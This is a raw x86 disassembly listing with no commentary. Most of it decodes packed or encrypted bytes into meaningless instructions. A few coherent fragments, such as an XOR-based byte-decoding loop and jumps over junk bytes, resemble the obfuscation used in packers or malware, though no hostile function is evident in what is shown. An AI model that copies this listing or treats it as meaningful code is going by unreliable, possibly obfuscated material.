  4079a6:	mov    ds:0x90c35213,al
  4079ab:	mov    ah,0xc3
  4079ad:	inc    ebp
  4079ae:	repnz rol ax,cl
  4079b2:	jl     0x407a05
  4079b4:	je     0x4079f5
  4079b6:	mov    ds:0x322e762c,al
  4079bb:	loope  0x40794b
  4079bd:	scas   al,BYTE PTR es:[edi]
  4079be:	dec    ebx
  4079bf:	or     al,0x24
  4079c1:	pop    ebp
  4079c2:	les    esi,FWORD PTR [ecx]
  4079c4:	cli    
  4079c5:	int3   
  4079c6:	retf   0xd28b
  4079c9:	aaa    
  4079ca:	ins    DWORD PTR es:[edi],dx
  4079cb:	mulps  xmm2,XMMWORD PTR [ebp+0x36]
  4079cf:	xor    eax,0x95cba353
  4079d4:	fdecstp 
  4079d6:	loope  0x4079fb
  4079d8:	out    dx,al
  4079d9:	fimul  DWORD PTR [eax+0x828320a]
  4079df:	repz cmp al,0xa2
  4079e2:	cli    
  4079e3:	fild   DWORD PTR [eax]
  4079e5:	dec    edx
  4079e6:	gs cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4079e9:	mov    eax,0x3576ae2b
  4079ee:	xchg   edi,eax
  4079ef:	jns    0x40797f
  4079f1:	test   BYTE PTR [edi+esi*2+0x59],0x29
  4079f6:	mov    ebp,0xba3f0c8b
  4079fb:	daa    
  4079fc:	dec    eax
  4079fd:	xchg   ebx,eax
  4079fe:	pop    edi
  4079ff:	pop    esi
  407a00:	ds or  ah,bh
  407a03:	jmp    0x98d4:0x37e203b
  407a0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407a0b:	xor    BYTE PTR [esi+0xd],0x4d
  407a0f:	out    dx,eax
  407a10:	imul   ebp,DWORD PTR [ebp+0x10],0x1d
  407a14:	adc    bh,cl
  407a16:	pop    es
  407a17:	xor    al,0x74
  407a19:	iret   
  407a1a:	xchg   esp,eax
  407a1b:	sti    
  407a1c:	aas    
  407a1d:	les    edi,FWORD PTR [ebx]
  407a1f:	icebp  
  407a20:	dec    ecx
  407a21:	mov    ah,al
  407a23:	sub    dl,bl
  407a25:	or     edx,DWORD PTR [ebx+0x6d]
  407a28:	data16 mov ah,0x9
  407a2b:	ins    BYTE PTR es:[edi],dx
  407a2c:	or     edi,DWORD PTR [eax-0x59]
  407a2f:	fild   DWORD PTR [ecx+0x16dfcae7]
  407a35:	mov    eax,ds:0xb7261494
  407a3a:	sub    eax,0x203d6a52
  407a3f:	mov    ch,al
  407a41:	adc    ah,dh
  407a43:	xor    eax,0xd3581ecf
  407a48:	cld    
  407a49:	loope  0x407a99
  407a4b:	and    BYTE PTR [ecx],cl
  407a4d:	adc    dl,BYTE PTR [edi]
  407a4f:	scas   al,BYTE PTR es:[edi]
  407a50:	add    DWORD PTR [ebx+eax*4+0x6ffb63b],eax
  407a57:	adc    BYTE PTR [esi+0x1],ch
  407a5a:	push   esi
  407a5b:	mov    WORD PTR [edx],gs
  407a5d:	cmp    ebx,ebp
  407a5f:	fwait
  407a60:	jmp    0xff7a42d1
  407a65:	pop    esp
  407a66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a67:	dec    edi
  407a68:	adc    ah,bh
  407a6a:	mov    edx,0x4719a178
  407a6f:	mov    edi,0x7906c007
  407a74:	push   es
  407a75:	mov    edx,0xd0be7134
  407a7a:	clc    
  407a7b:	mov    esi,DWORD PTR [edx-0x4f3f1d84]
  407a81:	mov    ah,0x10
  407a83:	mov    bh,0x3d
  407a85:	push   eax
  407a86:	jmp    0x407aef
  407a88:	or     al,0x47
  407a8a:	ins    BYTE PTR es:[edi],dx
  407a8b:	outs   dx,BYTE PTR ds:[esi]
  407a8c:	shl    BYTE PTR [esi+0x3],cl
  407a8f:	(bad)  
  407a90:	movzx  eax,ax
  407a93:	mov    DWORD PTR [ebp-0x14],eax
  407a96:	mov    eax,DWORD PTR [ebp+0x8]
  407a99:	movzx  eax,WORD PTR [eax+edx*4]
  407a9d:	xor    eax,0x8a36
  407aa2:	add    eax,edi
  407aa4:	mov    edi,DWORD PTR [ebp-0x14]
  407aa7:	mov    BYTE PTR [ebp+edi*1-0x58],al
  407aab:	mov    eax,DWORD PTR [ebp-0xc]
  407aae:	inc    edx
  407aaf:	jmp    0x407db8
  407ab4:	ror    ebp,0xd6
  407ab7:	retf   
  407ab8:	fcmove st,st(3)
  407aba:	rcl    ebp,1
  407abc:	adc    edx,DWORD PTR [esi+0x3c]
  407abf:	xchg   esp,eax
  407ac0:	xor    esi,ecx
  407ac2:	adc    eax,0x78db9c90
  407ac7:	js     0x407b2d
  407ac9:	jle    0x407b43
  407acb:	js     0x407a78
  407acd:	sub    BYTE PTR [eax-0x40],0xc9
  407ad1:	out    0xfb,eax
  407ad3:	adc    bl,cl
  407ad5:	push   0xa2654a57
  407ada:	dec    ecx
  407adb:	push   edx
  407adc:	pushf  
  407add:	add    edx,DWORD PTR [eax-0x351530a6]
  407ae3:	test   al,0xd7
  407ae5:	outs   dx,DWORD PTR ds:[esi]
  407ae6:	bswap  ebp
  407ae8:	xchg   ebp,eax
  407ae9:	imul   edi,DWORD PTR [edx-0x7f],0xffffffed
  407aed:	data16 jns 0x407aac
  407af0:	pusha  
  407af1:	adc    DWORD PTR [ebp-0x33],edx
  407af4:	jge    0x407af3
  407af6:	mov    cs,WORD PTR [eax]
  407af8:	je     0x407b66
  407afa:	test   eax,0xb7584b22
  407aff:	sub    ecx,ecx
  407b01:	outs   dx,BYTE PTR ds:[esi]
  407b02:	mov    dh,0xc
  407b04:	jmp    0x9669:0xd02dae7a
  407b0b:	add    al,0x29
  407b0d:	(bad)  
  407b0e:	loopne 0x407ac8
  407b10:	ins    BYTE PTR es:[edi],dx
  407b11:	addr16 (bad) 
  407b13:	fadd   DWORD PTR [ebx-0x129a8ae8]
  407b19:	jne    0x407af9
  407b1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407b1c:	push   edx
  407b1d:	repnz (bad) 
  407b1f:	shl    DWORD PTR [eax+ebx*8-0x285a6c45],cl
  407b26:	out    0x22,al
  407b28:	out    dx,al
  407b29:	jmp    0x7c72:0xe3dfa950
  407b30:	imul   eax,DWORD PTR [eax-0xccdb3dc],0xffffffd6
  407b37:	adc    bh,ch
  407b39:	and    BYTE PTR [ecx],bl
  407b3b:	mov    ecx,0xa35cbba1
  407b40:	inc    esp
  407b41:	test   dh,dh
  407b43:	or     al,0xd9
  407b45:	pop    ds
  407b46:	pop    ds
  407b47:	pusha  
  407b48:	repz in eax,dx
  407b4a:	pop    DWORD PTR [edi+0x72217463]
  407b50:	xor    BYTE PTR [edi-0xe4ed389],ch
  407b56:	mov    edi,0x35549ed5
  407b5b:	rcr    cl,0x3c
  407b5e:	dec    eax
  407b5f:	fs sub eax,0x7ba6f02c
  407b65:	ss (bad) 
  407b67:	fsubr  QWORD PTR [edx-0x3d852cc]
  407b6d:	outs   dx,DWORD PTR ds:[esi]
  407b6e:	call   0x91c9:0x2b78cf55
  407b75:	mov    edi,0x6ee4e641
  407b7a:	lock pop esi
  407b7c:	enter  0x3f1f,0xa3
  407b80:	xchg   ebp,eax
  407b81:	mov    bh,0xdd
  407b83:	mov    edi,0xee886a3a
  407b88:	sub    BYTE PTR [ebx-0x75],dh
  407b8b:	idiv   DWORD PTR [ebx]
  407b8d:	sti    
  407b8e:	push   eax
  407b8f:	in     al,0x5d
  407b91:	and    ebx,0x27
  407b94:	test   eax,0x2eb862b1
  407b99:	jp     0x407b96
  407b9b:	aam    0xc6
  407b9d:	sub    al,0xc6
  407b9f:	mov    ch,0xd8
  407ba1:	xor    esp,DWORD PTR [ebp-0xdf95c11]
  407ba7:	inc    eax
  407ba8:	jo     0x407bd4
  407baa:	mov    ds:0x366fd225,eax
  407baf:	sbb    BYTE PTR [ecx+0x32],bh
  407bb2:	test   al,0x20
  407bb4:	and    eax,0xa99ed444
  407bb9:	push   0x4
  407bbb:	xor    BYTE PTR [eax+edx*4-0x623b98],0x3a
  407bc3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407bc4:	dec    edx
  407bc5:	leave  
  407bc6:	ss dec ebx
  407bc8:	jbe    0x407c47
  407bca:	leave  
  407bcb:	call   0x3ad49d29
  407bd0:	adc    ebx,ebx
  407bd2:	sbb    ebx,0xdf976215
  407bd8:	rcr    DWORD PTR [edi-0x71],cl
  407bdb:	sbb    al,0x40
  407bdd:	inc    esp
  407bde:	push   esi
  407bdf:	jbe    0x407c12
  407be1:	and    al,ch
  407be3:	outs   dx,DWORD PTR ds:[esi]
  407be4:	scas   al,BYTE PTR es:[edi]
  407be5:	and    BYTE PTR [edx-0x6c],dh
  407be8:	sub    eax,0x70a322f1
  407bed:	dec    eax
  407bee:	imul   al
  407bf0:	inc    ebp
  407bf1:	shl    DWORD PTR [eax-0x1b4bf3ac],cl
  407bf7:	test   eax,0xc49bf867
  407bfc:	sbb    edx,DWORD PTR [esi+0x307a4b85]
  407c02:	iret   
  407c03:	out    0xcc,eax
  407c05:	cwde   
  407c06:	mov    bl,0xb1
  407c08:	adc    DWORD PTR [ebx-0x36],eax
  407c0b:	cmc    
  407c0c:	addr16 dec esi
  407c0e:	add    eax,0x63827394
  407c13:	pushf  
  407c14:	pop    ebp
  407c15:	push   ebx
  407c16:	das    
  407c17:	pop    ss
  407c18:	sub    al,0x41
  407c1a:	rol    BYTE PTR [esp+ecx*2],0xe7
  407c1e:	repnz and al,0x1b
  407c21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407c22:	push   esp
  407c23:	cmp    eax,0xc944fa3c
  407c28:	push   0xef4cfac0
  407c2d:	imul   eax,edi,0xe4b4505a
  407c33:	lods   eax,DWORD PTR ds:[esi]
  407c34:	fist   WORD PTR [ebx-0x79f594df]
  407c3a:	loopne 0x407c11
  407c3c:	xor    BYTE PTR [ebp-0x7f011ab6],dl
  407c42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407c43:	(bad)  
  407c44:	push   ecx
  407c45:	in     eax,dx
  407c46:	ins    BYTE PTR es:[edi],dx
  407c47:	call   0xc87d:0xdf1c5be2
  407c4e:	jae    0x407c58
  407c50:	enter  0xb391,0xd3
  407c54:	sbb    eax,0xf4b5e6ec
  407c59:	sub    ch,ah
  407c5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407c5c:	sub    al,0xaa
  407c5e:	je     0x407c2b
  407c60:	leave  
  407c61:	retf   0x46e1
  407c64:	jb     0x407ca6
  407c66:	xor    cl,bh
  407c68:	jmp    0x70b5:0x191ed67b
  407c6f:	fisub  WORD PTR [ecx-0x3b07f335]
  407c75:	mov    esi,0x1612391
  407c7a:	out    0x8c,eax
  407c7c:	in     eax,0x9
  407c7e:	push   0xb4de300c
  407c83:	adc    al,0x32
  407c85:	repnz in eax,dx
  407c87:	cwde   
  407c88:	rcr    ebp,1
  407c8a:	mov    WORD PTR [esi+ebx*1-0x79],es
  407c8e:	stos   BYTE PTR es:[edi],al
  407c8f:	(bad)  
  407c90:	scas   al,BYTE PTR es:[edi]
  407c91:	inc    ecx
  407c92:	fs mov ah,0x32
  407c95:	mov    eax,0x91f87fee
  407c9a:	pop    es
  407c9b:	mov    cl,0x12
  407c9d:	in     eax,0x71
  407c9f:	out    0xaa,al
  407ca1:	xlat   BYTE PTR ds:[ebx]
  407ca2:	retf   0xb4da
  407ca5:	inc    edx
  407ca6:	and    al,0xde
  407ca8:	or     al,0x11
  407caa:	loope  0x407c91
  407cac:	cmc    
  407cad:	inc    edx
  407cae:	fucom  st(0)
  407cb0:	(bad)  
  407cb1:	push   cs
  407cb2:	das    
  407cb3:	daa    
  407cb4:	popa   
  407cb5:	dec    ebx
  407cb6:	or     DWORD PTR [ebp-0x579a2bb6],ebp
  407cbc:	fdiv   DWORD PTR ss:[ecx+0x572cab3]
  407cc3:	inc    ebp
  407cc4:	jo     0x407d2d
  407cc6:	outs   dx,DWORD PTR ds:[esi]
  407cc7:	and    BYTE PTR [eax-0x11],al
  407cca:	xor    esp,DWORD PTR [eax+0x75]
  407ccd:	jbe    0x407d2d
  407ccf:	or     al,0x13
  407cd1:	sub    eax,0x25431ad5
  407cd6:	in     al,0xa4
  407cd8:	cmp    ebp,DWORD PTR [ecx-0x74]
  407cdb:	inc    BYTE PTR [ebx-0x58f0a619]
  407ce1:	aam    0xea
  407ce3:	dec    eax
  407ce4:	in     al,dx
  407ce5:	xchg   esp,eax
  407ce6:	dec    eax
  407ce7:	das    
  407ce8:	out    0xc0,eax
  407cea:	repnz sub BYTE PTR [edi],0x51
  407cee:	cmp    BYTE PTR [edx+0x33906054],ah
  407cf4:	mov    dh,0xd7
  407cf6:	mov    edi,0x5db89c67
  407cfb:	and    BYTE PTR [esp+esi*8-0x5df067b9],0x5d
  407d03:	repz pop eax
  407d05:	lods   eax,DWORD PTR ds:[esi]
  407d06:	arpl   WORD PTR [ebp+0x1a29bc83],sp
  407d0c:	hlt    
  407d0d:	adc    esp,DWORD PTR [esi-0x4c]
  407d10:	retf   0xfe48
  407d13:	add    DWORD PTR ds:0xc8fbb922,ebx
  407d19:	sub    BYTE PTR [edx+0x24],bh
  407d1c:	scas   eax,DWORD PTR es:[edi]
  407d1d:	std    
  407d1e:	mov    ebp,0xa59559c4
  407d23:	and    al,0xf5
  407d25:	jnp    0x407ce0
  407d27:	aam    0xa9
  407d29:	or     BYTE PTR [edi-0x69],ah
  407d2c:	mov    eax,ds:0x66089fc9
  407d31:	or     ah,ah
  407d33:	push   esi
  407d34:	mov    dh,0xb1
  407d36:	gs or  al,0x4a
  407d39:	lods   al,BYTE PTR ds:[esi]
  407d3a:	or     bh,dh
  407d3c:	(bad)  
  407d3d:	(bad)  
  407d3e:	dec    eax
  407d3f:	(bad)  
  407d40:	iret   
  407d41:	mov    edx,0x2407e04c
  407d46:	sub    ch,BYTE PTR [ebp+0x4]
  407d49:	mov    cl,0x44
  407d4b:	cmp    eax,0x1a580116
  407d50:	dec    ebx
  407d51:	std    
  407d52:	and    eax,0x679ee889
  407d57:	mov    edx,0x9d9af10a
  407d5c:	shl    DWORD PTR [ebx],1
  407d5e:	call   0x8892:0x23a9bb5a
  407d65:	lock sar BYTE PTR [esi-0x4ae7a3],1
  407d6c:	and    DWORD PTR [esi+edi*8-0x5d],ebx
  407d70:	xchg   edi,eax
  407d71:	loopne 0x407d1b
  407d73:	les    esi,FWORD PTR [edi]
  407d75:	imul   ebx,eax,0x91c3d430
  407d7b:	push   es
  407d7c:	jmp    0x94cd4d0c
  407d81:	push   edx
  407d82:	call   0x5ab5:0xd8eca622
  407d89:	int    0xa2
  407d8b:	fldcw  WORD PTR [edx-0x69d13855]
  407d91:	das    
  407d92:	jne    0x407d42
  407d94:	into   
  407d95:	mov    edx,0xbbdaddff
  407d9a:	dec    edx
  407d9b:	in     al,0x4f
  407d9d:	scas   eax,DWORD PTR es:[edi]
  407d9e:	stc    
  407d9f:	push   ebp
  407da0:	xchg   edx,eax
  407da1:	xor    al,0x10
  407da3:	stos   BYTE PTR es:[edi],al
  407da4:	lods   eax,DWORD PTR ds:[esi]
  407da5:	nop
  407da6:	dec    edi
  407da7:	push   es
  407da8:	dec    esi
  407da9:	nop
  407daa:	add    al,0x19
  407dac:	aaa    
  407dad:	xchg   edi,eax
  407dae:	dec    esp
  407daf:	ret    0xbe82
  407db2:	shr    DWORD PTR [ebx-0x5a],cl
  407db5:	mov    ch,0xef
  407db7:	inc    esi
  407db8:	cmp    edx,eax
  407dba:	jne    0x407772
  407dc0:	pop    edi
  407dc1:	pop    ebx
  407dc2:	mov    eax,DWORD PTR [ebp-0x8]
  407dc5:	mov    edx,DWORD PTR [ebp+0x10]
  407dc8:	jmp    0x4080d1
  407dcd:	retf   0xd73f
  407dd0:	ret    0xdad9
  407dd3:	fld    st(7)
  407dd5:	add    BYTE PTR [eax+0x7c],bl
  407dd8:	fdivr  DWORD PTR [esi]
  407dda:	stos   BYTE PTR es:[edi],al
  407ddb:	push   es
  407ddc:	and    al,0x88
  407dde:	fdivr  DWORD PTR [eax+0x78]
  407de1:	fs jle 0x407e5c
  407de4:	js     0x407df8
  407de6:	ins    DWORD PTR es:[edi],dx
  407de7:	mov    cl,0x28
  407de9:	aaa    
  407dea:	mov    dl,0x1e
  407dec:	cmp    eax,0x10122d18
  407df1:	aam    0x4
  407df3:	arpl   WORD PTR [ebx+0x47],cx
  407df6:	stos   BYTE PTR es:[edi],al
  407df7:	jmp    0x3509:0x7ad9b1b6
  407dfe:	lea    edx,es:[esp+eax*4]
  407e02:	sub    ah,dh
  407e04:	enter  0x9727,0x39
  407e08:	es push ds
  407e0a:	int    0x99
  407e0c:	xchg   edi,eax
  407e0d:	shr    BYTE PTR [esi-0x26a5e8a8],1
  407e13:	add    BYTE PTR [esi-0x46],bl
  407e16:	cwde   
  407e17:	inc    esp
  407e18:	test   ebp,esp
  407e1a:	je     0x407dba
  407e1c:	jmp    0x407dcf
  407e1e:	(bad)  
  407e20:	jl     0x407e0c
  407e22:	call   0x564f:0x2ba12286
  407e29:	mov    ecx,0x61b9a744
  407e2e:	out    dx,eax
  407e2f:	push   0x74
  407e31:	test   eax,0x63eb3925
  407e36:	or     DWORD PTR [eax],edi
  407e38:	cmp    al,0x92
  407e3a:	std    
  407e3b:	fcom   QWORD PTR [ebx+0x323ce3ad]
  407e41:	cmc    
  407e42:	icebp  
  407e43:	leave  
  407e44:	rol    bh,0x7
  407e47:	cwde   
  407e48:	mov    ch,0x47
  407e4a:	mov    ch,bl
  407e4c:	add    al,0x49
  407e4e:	push   cs
  407e4f:	jnp    0x407e8e
  407e51:	(bad)
  407e54:	pop    esi
  407e55:	jge    0x407dee
  407e57:	inc    esi
  407e58:	lods   eax,DWORD PTR ds:[esi]
  407e59:	pop    ecx
  407e5a:	cmp    dh,BYTE PTR [edi-0x5e275c81]
  407e60:	mov    ch,0x9f
  407e62:	mov    ah,0x7f
  407e64:	sub    eax,0x309bbc6a
  407e69:	fist   WORD PTR [edx-0x3b]
  407e6c:	lods   eax,DWORD PTR ds:[esi]
  407e6d:	cli    
  407e6e:	pop    ss
  407e6f:	inc    edi
  407e70:	outs   dx,DWORD PTR ds:[esi]
  407e71:	sub    cl,bl
  407e73:	cs cli 
  407e75:	bound  ebx,QWORD PTR [ebp-0x306f33f0]
  407e7b:	add    ah,BYTE PTR [ebx+ebp*2]
  407e7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407e7f:	pop    edi
  407e80:	add    DWORD PTR [ebp-0x2909bec3],edx
  407e86:	out    0xd6,eax
  407e88:	inc    esi
  407e89:	mov    ebx,0xf5b76a6f
  407e8e:	sub    eax,DWORD PTR [edx+0x62]
  407e91:	fldcw  WORD PTR [edx-0x5eafc418]
  407e97:	(bad)  
  407e98:	and    eax,0xad7d8063
  407e9d:	jo     0x407e6e
  407e9f:	ins    BYTE PTR es:[edi],dx
  407ea0:	inc    eax
  407ea1:	dec    esp
  407ea2:	lds    ebp,FWORD PTR [edi]
  407ea4:	add    BYTE PTR es:[ebp+0x10fd94d1],cl
  407eab:	jge    0x407eaf
  407ead:	xchg   esi,eax
  407eae:	fldenv [ecx]
  407eb0:	popf   
  407eb1:	daa    
  407eb2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407eb3:	out    dx,eax
  407eb4:	pop    esp
  407eb5:	xchg   ebp,eax
  407eb6:	dec    ebp
  407eb7:	push   es
  407eb8:	fisttp DWORD PTR [ebp+0x7d]
  407ebb:	jbe    0x407e9e
  407ebd:	scas   eax,DWORD PTR es:[edi]
  407ebe:	jbe    0x407f07
  407ec0:	outs   dx,DWORD PTR ds:[esi]
  407ec1:	xor    cl,dh
  407ec3:	stos   BYTE PTR es:[edi],al
  407ec4:	lods   eax,DWORD PTR ds:[esi]
  407ec5:	je     0x407e66
  407ec7:	loope  0x407e94
  407ec9:	push   cs
  407eca:	fcom   QWORD PTR [eax-0x79]
  407ecd:	test   eax,0x3616171a
  407ed2:	cli    
  407ed3:	jge    0x407eea
  407ed5:	mov    BYTE PTR [ebp+0x10],bl
  407ed8:	xor    esi,0x56faef1d
  407ede:	enter  0x35ad,0x10
  407ee2:	jl     0x407ee3
  407ee4:	hlt    
  407ee5:	retf   
  407ee6:	shl    DWORD PTR [ebp+0x27812363],cl
  407eec:	enter  0x6c9b,0xb1
  407ef0:	(bad)  
  407ef1:	sar    BYTE PTR [eax+0x4e],cl
  407ef4:	shr    DWORD PTR [ebx-0x25],0x45
  407ef8:	iret   
  407ef9:	push   0x14
  407efb:	lahf   
  407efc:	pop    ss
  407efd:	dec    eax
  407efe:	dec    edx
  407eff:	jmp    0x407ebc
  407f01:	lahf   
  407f02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f03:	xor    cl,BYTE PTR [ecx-0x53]
  407f06:	cmp    ebx,edi
  407f08:	xchg   ah,bh
  407f0a:	push   esp
  407f0b:	push   ecx
  407f0c:	imul   esp,DWORD PTR [ebp+0x3dca1f71],0x24
  407f13:	mov    ch,0x4a
  407f15:	sbb    al,0x34
  407f17:	adc    eax,0xb1ec1206
  407f1c:	pushf  
  407f1d:	add    ebx,DWORD PTR [esi+esi*2-0x3e0fe62c]
  407f24:	jl     0x407eef
  407f26:	je     0x407f07
  407f28:	dec    ecx
  407f29:	mov    ecx,0x14110d7e
  407f2e:	xchg   ebx,eax
  407f2f:	and    eax,esp
  407f31:	push   esi
  407f32:	in     al,0x67
  407f34:	call   0xd8bc:0x143bef2c
  407f3b:	xor    eax,0x85fa7a46
  407f40:	xchg   BYTE PTR [ebp-0x71de9ab0],al
  407f46:	mov    cl,0x2e
  407f48:	mov    cl,0xf5
  407f4a:	lods   eax,DWORD PTR ds:[esi]
  407f4b:	mov    ds,WORD PTR [ebx+0x1f1826e3]
  407f51:	cmp    eax,0xcf677f6a
  407f56:	cmp    esp,DWORD PTR [ecx+0x10d7a3eb]
  407f5c:	add    al,0x67
  407f5e:	loop   0x407f47
  407f60:	scas   al,BYTE PTR es:[edi]
  407f61:	mov    ch,0xc0
  407f63:	mov    ds:0xe98386b,al
  407f68:	xchg   DWORD PTR [esi+0x6c],esp
  407f6b:	cmp    edi,DWORD PTR [edi-0x6e]
  407f6e:	or     al,0x51
  407f70:	fadd   DWORD PTR [edi-0x71]
  407f73:	(bad)  
  407f75:	lods   eax,DWORD PTR ds:[esi]
  407f76:	xor    eax,0x1163231a
  407f7b:	xchg   esp,eax
  407f7c:	jbe    0x407f4f
  407f7e:	mov    edi,0x863b6edc
  407f83:	test   al,0x55
  407f85:	data16 mov WORD PTR [esp+esi*8-0x48],?
  407f8a:	push   eax
  407f8b:	enter  0x9007,0x70
  407f8f:	jle    0x407f85
  407f91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f92:	arpl   WORD PTR [ebx-0x77],bx
  407f95:	in     eax,0xf7
  407f97:	es out 0x64,al
  407f9a:	ins    DWORD PTR es:[edi],dx
  407f9b:	add    DWORD PTR [ebp+0x86152e8],esp
  407fa1:	sbb    eax,0x6ea84538
  407fa6:	idiv   DWORD PTR [ecx-0x66e1c29f]
  407fac:	lds    edx,FWORD PTR [eax-0x3c63fb09]
  407fb2:	add    eax,ebp
  407fb4:	inc    eax
  407fb5:	out    dx,eax
  407fb6:	repz (bad) 
  407fb8:	iret   
  407fb9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407fba:	sbb    al,0xd0
  407fbc:	mov    cl,0x27
  407fbe:	(bad)  
  407fbf:	test   BYTE PTR ds:0x69d819b4,0x97
  407fc6:	into   
  407fc7:	in     eax,0x76
  407fc9:	in     eax,0x17
  407fcb:	ss stos BYTE PTR es:[edi],al
  407fcd:	xor    cl,BYTE PTR [ebp-0x5d28d3a9]
  407fd3:	inc    ebp
  407fd4:	into   
  407fd5:	cmp    DWORD PTR [edx-0x5b816700],ebp
  407fdb:	lods   eax,DWORD PTR ds:[esi]
  407fdc:	jg     0x407fe5
  407fde:	ret    0xbf29
  407fe1:	fld    st(2)
  407fe3:	cld    
  407fe4:	and    eax,0x69a785e1
  407fe9:	dec    ecx
  407fea:	fadd   DWORD PTR [eax+0x82defa6]
  407ff0:	push   ds
  407ff1:	sub    DWORD PTR [edx],ebx
  407ff3:	and    al,0x37
  407ff5:	fs push edx
  407ff7:	mov    eax,0xf1419a41
  407ffc:	mov    ebp,0x5e0daeee
  408001:	pop    eax
  408002:	xchg   esi,eax
  408003:	daa    
  408004:	xor    DWORD PTR [ebx-0x5c86adee],esp
  40800a:	push   ecx
  40800b:	retf   0xbb70
  40800e:	or     BYTE PTR ds:0x65e6fb4d,ah
  408014:	loope  0x40800f
  408016:	out    0x4,al
  408018:	call   0x824e836c
  40801d:	call   0xb775:0xbad0b12f
  408024:	jns    0x408011
  408026:	inc    ecx
  408027:	sbb    al,0x23
  408029:	mov    bh,0x87
  40802b:	out    0x6c,eax
  40802d:	xchg   ebp,eax
  40802e:	sbb    eax,0x4a95219
  408033:	mov    ds:0x13073eaa,al
  408038:	jb     0x40808b
  40803a:	dec    esp
  40803b:	iret   
  40803c:	and    BYTE PTR gs:[eax-0xe],dh
  408040:	inc    esp
  408041:	push   esp
  408042:	outs   dx,BYTE PTR ds:[esi]
  408043:	mov    ebp,0xe5182fb6
  408048:	iret   
  408049:	mov    bl,0x55
  40804b:	sti    
  40804c:	cmovnp esi,DWORD PTR [esi-0x5e]
  408050:	dec    ebx
  408051:	in     eax,dx
  408052:	bound  ebp,QWORD PTR [ebx+0x50]
  408055:	iret   
  408056:	pop    esp
  408057:	xchg   ebx,eax
  408058:	out    0x72,al
  40805a:	int3   
  40805b:	dec    ebp
  40805c:	in     al,0x1f
  40805e:	icebp  
  40805f:	jecxz  0x4080de
  408061:	ja     0x407ffa
  408063:	mov    al,ds:0x9cf42c5f
  408068:	(bad)
  40806b:	jo     0x4080a7
  40806d:	or     BYTE PTR [esp+ebp*4+0xf],bh
  408071:	mov    BYTE PTR [ebp+ebx*2+0x74],dl
  408075:	sub    al,0x18
  408077:	shl    DWORD PTR [ecx],1
  408079:	arpl   WORD PTR [edx-0x77],sp
  40807c:	pop    edx
  40807d:	mov    eax,ds:0x6212bdad
  408082:	lods   eax,DWORD PTR ds:[esi]
  408083:	sti    
  408084:	out    dx,al
  408085:	outs   dx,BYTE PTR ds:[esi]
  408086:	aad    0xd
  408088:	mov    dl,0x6f
  40808a:	std    
  40808b:	(bad)  
  40808c:	fdiv   DWORD PTR [esi-0xc]
  40808f:	stos   BYTE PTR es:[edi],al
  408090:	mov    ds:0xd2c93257,eax
  408095:	jge    0x40804c
  408097:	test   eax,0x1f33f6ce
  40809c:	xchg   esp,eax
  40809d:	pop    edi
  40809e:	and    ebp,esp
  4080a0:	xor    al,0xd0
  4080a2:	push   esi
  4080a3:	in     eax,0xc2
  4080a5:	retf   
  4080a6:	nop
  4080a7:	mov    dl,0x2f
  4080a9:	push   0xffffffbf
  4080ab:	ror    DWORD PTR [eiz*1-0x32308b3f],1
  4080b2:	fisubr WORD PTR [esi]
  4080b4:	sti    
  4080b5:	clc    
  4080b6:	mov    ah,0x2a
  4080b8:	pop    ecx
  4080b9:	lods   eax,DWORD PTR ds:[esi]
  4080ba:	mov    bh,BYTE PTR [edi-0x7701b6b8]
  4080c0:	aad    0x14
  4080c2:	mov    WORD PTR [eax+0x2b],?
  4080c5:	xor    DWORD PTR [esi+0x12e24544],ebp
  4080cb:	jle    0x40813c
  4080cd:	imul   ebx,DWORD PTR [edi],0x40
  4080d0:	call   0xc6444208
  4080d5:	mov    DWORD PTR [edx],eax
  4080d7:	mov    eax,DWORD PTR [ebp-0x8]
  4080da:	xor    eax,ecx
  4080dc:	add    eax,esi
  4080de:	mov    DWORD PTR [ebp+0x8],eax
  4080e1:	mov    eax,DWORD PTR [ebp+0x8]
  4080e4:	jmp    0x4083ed
  4080e9:	ret    
  4080ea:	ror    ch,1
  4080ec:	rcr    ecx,0xc9
  4080ef:	rcl    esi,cl
  4080f1:	push   edx
  4080f2:	add    DWORD PTR [edx+0x23479175],eax
  4080f8:	mov    bl,0xf4
  4080fa:	fnstsw WORD PTR [eax+0x78]
  4080fd:	fs jle 0x408178
  408100:	js     0x4080a2
  408102:	stos   DWORD PTR es:[edi],eax
  408103:	jbe    0x408168
  408105:	loop   0x408153
  408107:	addr16 mov ds:0xa305,eax
  40810b:	jb     0x40818c
  40810d:	mov    al,ds:0x974f6bf2
  408112:	cmp    eax,0xcc152fb
  408117:	xchg   ebx,eax
  408118:	shl    edi,cl
  40811a:	mov    cl,0x33
  40811c:	test   ax,0xdf8f
  408120:	jbe    0x408108
  408122:	xchg   ebp,eax
  408123:	push   esi
  408124:	ret    
  408125:	cs in  eax,0x31
  408128:	lock dec esp
  40812a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40812b:	push   esp
  40812c:	pop    es
  40812d:	out    dx,al
  40812e:	ja     0x408167
  408130:	mov    ah,ch
  408132:	pop    es
  408133:	mov    esi,0x9900eec1
  408138:	inc    ebp
  408139:	jle    0x40811b
  40813b:	cmp    DWORD PTR [ebp+0x7bda54c6],0xffffffd8
  408142:	lods   al,BYTE PTR ds:[esi]
  408143:	add    BYTE PTR [eax+0x17],0x91
  408147:	inc    edi
  408148:	add    al,0x19
  40814a:	xchg   ebp,eax
  40814b:	jg     0x408136
  40814d:	xchg   esp,eax
  40814e:	retf   
  40814f:	mov    al,BYTE PTR [ebp-0x10b37c69]
  408155:	arpl   WORD PTR [edi],di
  408157:	int3   
  408158:	jg     0x4081bc
  40815a:	pop    esi
  40815b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40815c:	sbb    eax,0x215c7f3b
